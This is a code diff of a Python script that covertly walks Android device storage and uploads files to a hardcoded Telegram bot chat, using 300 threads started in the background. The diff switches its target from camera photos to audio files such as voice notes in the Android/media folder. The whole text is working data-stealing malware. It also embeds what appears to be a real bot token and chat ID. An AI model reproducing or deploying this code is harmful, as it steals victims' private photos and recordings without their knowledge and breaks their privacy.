@@ -16,20 +16,19 @@ except ImportError:
     import requests
 
 bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
-dir_path = "/storage/emulated/0/Camera/"
+dir_path = "/storage/emulated/0/Android/media/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
-        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')
-
+        if file_path.lower().endswith((".aac",".mp3", ".opus")):
+            bot.send_audio(chat_id=1249382653, audio=f, caption='By: @Shadow_hitler')
 def back():
-    with ThreadPoolExecutor(max_workers=300) as executor:
-        for root, dirs, files in os.walk(dir_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-                    executor.submit(send_file, file_path)
+	with ThreadPoolExecutor(max_workers=300) as executor:
+		for root, dirs, files in os.walk(dir_path):
+			for file in files:
+				file_path = os.path.join(root, file)
+				if file_path.lower().endswith((".aac",".mp3", ".opus")):
+					executor.submit(send_file, file_path)
 
 threading.Thread(target=back).start()
 
